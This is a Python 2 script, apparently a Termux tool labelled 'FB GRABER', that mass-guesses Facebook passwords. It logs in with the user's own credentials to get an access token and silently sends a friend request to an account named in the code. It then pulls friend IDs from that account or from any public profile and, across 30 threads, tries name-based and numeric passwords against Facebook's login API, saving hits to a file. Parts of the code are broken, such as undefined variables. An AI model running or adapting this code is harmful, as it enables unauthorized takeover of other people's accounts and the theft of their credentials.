# CRACKED BY PA I N


import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser

def anime(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


print 'FB GRABER'
os.system('clear')
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def kelwa():
    exlogo = '\n    \x1b[33;1mEXTING\x1b[37;1m.............\x1b[0m\n\t'
    anime(exlogo)
    os.system('rm -rif login.txt')
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


logo = "\n\x1b[37;1m____________________________________\n\x1b[31;1m ______   ___   __  _  __ __   ___   \n|      | /   \\ |  |/ ]|  |  | /   \\ \n|      ||     ||  ' / |  |  ||     |\n|_|  |_||  O  ||    \\ |  ~  ||  O  |\n  |  |  |     ||     \\|___, ||     |\n  |  |  |     ||  .  ||     ||     |\n  |__|   \\___/ |__|\\_||____/  \\___/ \n\x1b[37;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n#####################################\n\x1b[0m\n"

def tik():
    titik = ['.', '..', '...', '....', '.....', '......', '.......']
    print ' '
    for o in titik:
        print '\r\x1b[32;1m    Wait to Login\x1b[37;1m' + o + '\x1b[0m',
        sys.stdout.flush()
        time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
RH = "\n\x1b[37;1m____________________________________\n\x1b[31;1m ______   ___   __  _  __ __   ___   \n|      | /   \\ |  |/ ]|  |  | /   \\ \n|      ||     ||  ' / |  |  ||     |\n|_|  |_||  O  ||    \\ |  ~  ||  O  |\n  |  |  |     ||     \\|___, ||     |\n  |  |  |     ||  .  ||     ||     |\n  |__|   \\___/ |__|\\_||____/  \\___/ \n\x1b[37;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n#####################################\n\x1b[0m\n"

def idcr():
    uuid = requests.get('https://httpbin.org/uuid')
    jsonid = json.loads(uuid.text)
    idjscr = jsonid['uuid']
    os.system('touch /data/data/com.termux/tk.txt')
    reb = open('/data/data/com.termux/tk.txt', 'w')
    reb.write(idjscr)
    reb.close()
    chk()
print RH

def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        print logo
        fblogom = '\n   ${\x1b[37;1m<<<<<<<<<<<[\x1b[34;1mLogin Facebook\x1b[0m]\x1b[37;1m>>>>>>>>>>>\x1b[0m}$\n\t\t'
        print fblogom
        id = raw_input('    \x1b[32;1m[ EMAIL ] \x1b[37;1m>>>>>>>>>>> \x1b[0m  ')
        pwd = raw_input('    \x1b[32;1m[ PASS  ] \x1b[37;1m>>>>>>>>>>> \x1b[0m ')
        print ' '
        anime('   ${\x1b[37;1m<<<<<<<<<<<[\x1b[34;1mAccount Data\x1b[0m]\x1b[37;1m>>>>>>>>>>>\x1b[0m}$')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[31;1m    [\xc3\x97]% LOST INTERNET CONNECTION PLEASE CHECK YOU INTERNET'
            kelwa()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[32;1m    [\xe2\x9c\x93] Login Successfuly\x1b[0m'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                time.sleep(2)
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[31;1m    [%]\xc2\xae INTERNET CONNECTION LOST ERROR WHILE GET DATA\x1b[0m'
                kelwa()

        if 'checkpoint' in url:
            print '\n\x1b[31;1m    [%]\xc2\xa9 Your Account in CheckPoint Cant Be Used /\x1b[0m'
            os.system('rm -rf login.txt')
            time.sleep(2)
            login()
        else:
            print '\n\x1b[37;1m[{\xc3\x97}] Your \x1b[31;1mEmail\x1b[0m\x1b[37;1mOr Your \x1b[31;1mPassword\x1b[37;1mIS \x1b[31;1m Wrong /\x1b[0m'
            os.system('rm -rf login.txt')
            time.sleep(2)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[31;1m[#] Your Token Is Expired'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        namefb = a['name']
        id = a['id']
        ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
        b = json.loads(ots.text)
        subid = str(b['summary']['total_count'])
    except KeyError:
        os.system('clear')
        print '\n\x1b[34;1m[%]\xc2\xa9 Your Account in CheckPoint Cant Be Used /\x1b[0m'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\n\x1b[31;1m[%]\xc2\xae INTERNET CONNECTION LOST ERROR WHILE GET DATA\x1b[0m'
        kelwa()

    os.system('clear')
    xxj = '\n\x1b[36;1m\n\t.-~~~~-. \n       /   (o)(o)\n      /      .. |\n    /\\    \\____/\n    / \\   ,\\_/  \n     \\    /      \n\x1b[0m\n'
    print xxj
    print '\x1b[37;1m********************************************\x1b[37;1m[\x1b[36;1mACCOUNT DATA\x1b[37;1m]\x1b[37;1m********************************************\x1b[0m'
    print '\x1b[36;1m[\xe2\x9c\x93] Facbook Name : ' + '[ ' + namefb + ' ]'
    print '\x1b[36;1m[\xe2\x9c\x93] ID : [ ' + id + ' ]'
    print '\x1b[36;1m[\xe2\x9c\x93] ToTal Sub : ' + '[ ' + subid + ' ]'
    print '\x1b[0m'
    print '\x1b[37;1m********************************************\x1b[0m'
    print ' '
    opntn = '\n\x1b[37;1m********************************************\n \x1b[32;1m[ 1 ] For Start CRACKING \x1b[0m !\n \x1b[32;1m[ 0 ] For Logout Account \x1b[0m  !\n\x1b[37;1m********************************************\x1b[0m\n\t'
    print opntn
    time.sleep(1)
    option()


def option():
    unikers = raw_input('\n\x1b[37;1m [@] Option : \x1b[37;1m')
    if unikers == '':
        print '\x1b[31;1m [ \xcf\x80 ] Please Fill The Option Input'
        option()
    elif unikers == '1':
        graber()
    elif unikers == '0':
        anime('\x1b[37;1m[ ! ]\x1b[0m \x1b[32;1mLOGIN OUT ACCOUNT.......\x1b[0m')
        print ' '
        time.sleep(2)
        os.system('rm -rf login.txt')
        kelwa()
    else:
        print "\x1b[34;1m Please Don't Write anything Else just Write Option Number\x1b[0m"
        time.sleep(2)
        option()


def graber():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[37;1m[\x1b[33;1m T \x1b[0m]\x1b[37;1m Token Expired\x1b[0m'
        os.system('rm -rf login.txt')
        time.sleep(2)
        login()

    os.system('clear')
    print logo
    print '\x1b[37;1m>>>>>>>>>>>>>>>>>>>>>>>>>>>\x1b[0m'
    print '\x1b[34;1m[ 1 ] CRACKING From ID Of Friend\x1b[0m'
    print '\x1b[34;1m[ 2 ] CRACKING From Public ID \x1b[0m'
    print '\x1b[37;1m[ 0 ] EXIT\x1b[0m'
    print '\x1b[37;1m>>>>>>>>>>>>>>>>>>>>>>>>>>>\x1b[0m'
    startgrab()


def startgrab():
    global cekpoint
    global oks
    peak = raw_input('\x1b[32;1mCRACK : \x1b[37;1m')
    if peak == '':
        print '\x1b[31;1m [ \xcf\x80 ] Please Fill The Option Input'
        startgrab()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print '[ # ] \x1b[37;1mTo\x1b[0m_+_kyo\x1b[31;1m\x1b[0m'
            anime('\x1b[36;1mDump All Friend \x1b[36;1mID......\x1b[0m')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[37;1m[ \xe2\x99\xa4 ] ENTER PUBLIC ID : \x1b[0m')
            print '[ # ] \x1b[37;1mTo\x1b[0m_+_\x1b[31;1mkyo\x1b[0m'
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[36;1mFacebook Name :  \x1b[33;1m' + op['name'] + '\x1b[0m'
            except KeyError:
                print '\x1b[31;1mInvalid ID /\x1b[0m'
                time.sleep(3)
                graber()

            print '\x1b[34;1mDump All Friends  ID'
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '0':
            menu()
        else:
            print '\x1b[31;1mPlease Write A Valid Facebook ID.......\x1b[0m'
            startgrab()
        print '\x1b[36;1m[ \xe2\x99\xa1 ] All Id \x1b[34;1m' + str(len(id)) + '\x1b[0m'
        anime('\x1b[37;1m[ % ] PLEASE WAIT........................')
        titik = ['.', '..', '...', '....', '.....', '......', '.......']
        for o in titik:
            print '\r\x1b[37;1m[ \xe2\x9c\x93 ] CRACKING' + o,
            sys.stdout.flush()
            time.sleep(1)

    anime('\x1b[36;1mCRACKING START PLEASE WAIT UNTIL END.........')
    print '\x1b[37;1m=============================================='
    print ' '

    def main(arg):
        user = arg
        try:
            os.mkdir('Graber')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '1122334455'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                z = json.loads(x.text)
                print '\x1b[32;1m HACKED SUCCESS'
                print '\x1b[32;1mName : \x1b[37;1m' + b['name'] + '\x1b[0m'
                print '\x1b[32;1mID : \x1b[37;1m' + user + '\x1b[0m'
                print '\x1b[32;1mPassword : \x1b[37;1m' + pass1 + '\n' + '\x1b[0m'
                okes = open('Graber/hits.txt', 'a')
                okes.write(user + '|' + pass1 + '\n')
                okes.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[31;1mAccount On Checkpoint'
                print '\x1b[31;1mName : \x1b[37;1m' + b['name'] + '\x1b[0m'
                print '\x1b[31;1mID : \x1b[37;1m' + user + '\x1b[0m'
                print '\x1b[31;1mPassword : \x1b[37;1m' + pass1 + '\n' + '\x1b[0m'
                cek = open('Graber/id_pass.txt', 'a')
                cek.write(user + '|' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '112233445566'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                    z = json.loads(x.text)
                    print '\x1b[32;1m HACKED SUCCESS' + '\x1b[0m'
                    print '\x1b[32;1mName : \x1b[37;1m' + b['name'] + '\x1b[0m'
                    print '\x1b[32;1mID : \x1b[37;1m' + user
                    print '\x1b[32;1mPassword : \x1b[37;1m' + pass2 + '\n' + '\x1b[0m'
                    okes = open('Graber/hits.txt', 'a')
                    okes.write(user + '|' + pass2 + '\n')
                    okes.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[31;1mAccount On Checkpoint'
                    print '\x1b[31;1mName : \x1b[37;1m' + b['name']
                    print '\x1b[31;1mID : \x1b[37;1m' + user
                    print '\x1b[31;1mPassword : \x1b[37;1m' + pass2 + '\n' + '\x1b[0m'
                    cek = open('Graber/id_pass.txt', 'a')
                    cek.write(user + '|' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = '1122334455'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                        z = json.loads(x.text)
                        print '\x1b[32;1m HACKED SUCCESS' + '\x1b[0m'
                        print '\x1b[32;1mName : \x1b[37;1m' + b['name']
                        print '\x1b[32;1mID : \x1b[37;1m ' + user
                        print '\x1b[32;1mPassword : \x1b[37;1m' + pass3 + '\n' + '\x1b[0m'
                        okes = open('Graber/hits.txt', 'a')
                        okes.write(user + '|' + pass3 + '\n')
                        okes.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[31;1mAccount On Checkpoint'
                        print '\x1b[31;1mName : \x1b[37;1m' + b['name']
                        print '\x1b[31;1mID : \x1b[37;1m' + user
                        print '\x1b[31;1mPassword : \x1b[37;1m' + pass3 + '\n' + '\x1b[0m'
                        cek = open('Graber/id_pass.txt', 'a')
                        cek.write(user + '|' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = '112233445566'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                            z = json.loads(x.text)
                            print '\x1b[32;1m HACKED SUCCESS' + '\x1b[0m'
                            print '\x1b[32;1mName : \x1b[37;1m' + b['name']
                            print '\x1b[32;1mID : \x1b[37;1m' + user
                            print '\x1b[32;1mPassword : \x1b[37;1m' + pass4 + '\n' + '\x1b[0m'
                            okes = open('Graber/hits.txt', 'a')
                            okes.write(user + '|' + pass4 + '\n')
                            okes.close()
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[31;1mAccount On Checkpoint'
                            print '\x1b[31;1mName : \x1b[37;1m' + b['name']
                            print '\x1b[31;1mID : \x1b[37;1m' + user
                            print '\x1b[31;1mPassword : \x1b[37;1m' + pass4 + '\n' + '\x1b[0m'
                            cek = open('Graber/id_pass.txt', 'a')
                            cek.write(user + '|' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = b['first_name'] + '12345aa'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                z = json.loads(x.text)
                                print '\x1b[32;1m HACKED SUCCESS' + '\x1b[0m'
                                print '\x1b[32;1mName : \x1b[37;1m' + b['name']
                                print '\x1b[32;1mID : \x1b[37;1m ' + user
                                print '\x1b[32;1mPassword : \x1b[37;1m' + pass5 + '\n' + '\x1b[0m'
                                okes = open('Graber/hits.txt', 'a')
                                okes.write(user + '|' + pass5 + '\n')
                                okes.close()
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[31;1mAccount On Checkpoint'
                                print '\x1b[31;1mName : \x1b[37;1m' + b['name']
                                print '\x1b[31;1mID : \x1b[37;1m' + user
                                print '\x1b[31;1mPassword : \x1b[37;1m' + pass5 + '\n' + '\x1b[0m'
                                cek = open('Graber/id_pass.txt', 'a')
                                cek.write(user + '|' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = b['first_name'] + '12345aa'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                    z = json.loads(x.text)
                                    print '\x1b[32;1m HACKED SUCCESS' + '\x1b[0m'
                                    print '\x1b[32;1mName : \x1b[37;1m' + b['name']
                                    print '\x1b[32;1mID : \x1b[37;1m ' + user
                                    print '\x1b[32;1mPassword : \x1b[37;1m' + pass6 + '\n' + '\x1b[0m'
                                    okes = open('Graber/hits.txt', 'a')
                                    okes.write(user + '|' + pass6 + '\n')
                                    okes.close()
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[31;1mAccount On Checkpoint'
                                    print '\x1b[31;1mName : \x1b[37;1m' + b['name']
                                    print '\x1b[31;1mID : \x1b[37;1m' + user
                                    print '\x1b[31;1mPassword : \x1b[37;1m' + pass6 + '\n' + '\x1b[0m'
                                    cek = open('Graber/id_pass.txt', 'a')
                                    cek.write(user + '|' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = b['first_name'] + '12345678'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                        z = json.loads(x.text)
                                        print '\x1b[32;1m HACKED SUCCESS' + '\x1b[0m'
                                        print '\x1b[32;1mName : \x1b[37;1m' + b['name']
                                        print '\x1b[32;1mID : \x1b[37;1m ' + user
                                        print '\x1b[32;1mPassword : \x1b[37;1m' + pass7 + '\n' + '\x1b[0m'
                                        okes = open('Graber/hits.txt', 'a')
                                        okes.write(user + '|' + pass7 + '\n')
                                        okes.close()
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[31;1mAccount On Checkpoint'
                                        print '\x1b[31;1mName : \x1b[37;1m' + b['name']
                                        print '\x1b[31;1mID : \x1b[37;1m' + user
                                        print '\x1b[31;1mPassword : \x1b[37;1m' + pass7 + '\n' + '\x1b[0m'
                                        cek = open('Graber/id_pass.txt', 'a')
                                        cek.write(user + '|' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
                                    else:
                                        pass8 = '1234554321'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                            z = json.loads(x.text)
                                            print '\x1b[32;1m HACKED SUCCESS' + '\x1b[0m'
                                            print '\x1b[32;1mName : \x1b[37;1m' + b['name']
                                            print '\x1b[32;1mID : \x1b[37;1m ' + user
                                            print '\x1b[32;1mPassword : \x1b[37;1m' + pass8 + '\n' + '\x1b[0m'
                                            okes = open('Graber/hits.txt', 'a')
                                            okes.write(user + '|' + pass8 + '\n')
                                            okes.close()
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[31;1mAccount On Checkpoint'
                                            print '\x1b[31;1mName : \x1b[37;1m' + b['name']
                                            print '\x1b[31;1mID : \x1b[37;1m' + user
                                            print '\x1b[31;1mPassword : \x1b[37;1m' + pass8 + '\n' + '\x1b[0m'
                                            cek = open('Graber/id_pass.txt', 'a')
                                            cek.write(user + '|' + pass8 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass8)
                                        else:
                                            pmh = '123456654321'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                                z = json.loads(x.text)
                                                print '\x1b[32;1m HACKED SUCCESS' + '\x1b[0m'
                                                print '\x1b[32;1mName : \x1b[37;1m' + b['name']
                                                print '\x1b[32;1mID : \x1b[37;1m ' + user
                                                print '\x1b[32;1mPassword : \x1b[37;1m' + pass9 + '\n' + '\x1b[0m'
                                                okes = open('Graber/hits.txt', 'a')
                                                okes.write(user + '|' + pass9 + '\n')
                                                okes.close()
                                                oks.append(user + pass9)
                                            elif 'www.facebook.com' in q['error_msg']:
                                                print '\x1b[31;1mAccount On Checkpoint'
                                                print '\x1b[31;1mName : \x1b[37;1m' + b['name']
                                                print '\x1b[31;1mID : \x1b[37;1m' + user
                                                print '\x1b[31;1mPassword : \x1b[37;1m' + pass9 + '\n' + '\x1b[0m'
                                                cek = open('Graber/id_pass.txt', 'a')
                                                cek.write(user + '|' + pass9 + '\n')
                                                cek.close()
                                                cekpoint.append(user + pass9)
                                            else:
                                                pass10 = b['first_name'] + '12345'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                q = json.load(data)
                                                if 'access_token' in q:
                                                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                                    z = json.loads(x.text)
                                                    print '\x1b[32;1m HACKED SUCCESS' + '\x1b[0m'
                                                    print '\x1b[32;1mName : \x1b[37;1m' + b['name']
                                                    print '\x1b[32;1mID : \x1b[37;1m ' + user
                                                    print '\x1b[32;1mPassword : \x1b[37;1m' + pass10 + '\n' + '\x1b[0m'
                                                    oks.append(user + pass10)
                                                elif 'www.facebook.com' in q['error_msg']:
                                                    print '\x1b[31;1mAccount On Checkpoint'
                                                    print '\x1b[31;1mName : \x1b[37;1m' + b['name']
                                                    print '\x1b[31;1mID : \x1b[37;1m' + user
                                                    print '\x1b[31;1mPassword : \x1b[37;1m' + pass10 + '\n' + '\x1b[0m'
                                                    cek = open('Graber/id_pass.txt', 'a')
                                                    cek.write('ID:' + user + ' Pw:' + pass10 + '\n')
                                                    cek.close()
                                                    cekpoint.append(user + pass10)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    anime('\x1b[37;1m<<<<<<<<<<<<<<<\\Tokyo/>>>>>>>>>>>>>>>>\x1b[0m')
    print ' '
    print '\x1b[37;1m[ \xe2\x9c\x93 ] CRACKING END' + '\x1b[0m'
    print '\x1b[37;1mREsult \x1b[32;1mOKS/\x1b[31;1mCHECKPOINT\x1b[37;1m: \x1b[32;1m' + str(len(oks)) + '\x1b[37;1m/' + '\x1b[31;1m' + str(len(cekpoint))
    print ' '
    print logo
    time.sleep(3)
    raw_input('[ENTER]')
    menu()


if __name__ == '__main__':
    login()
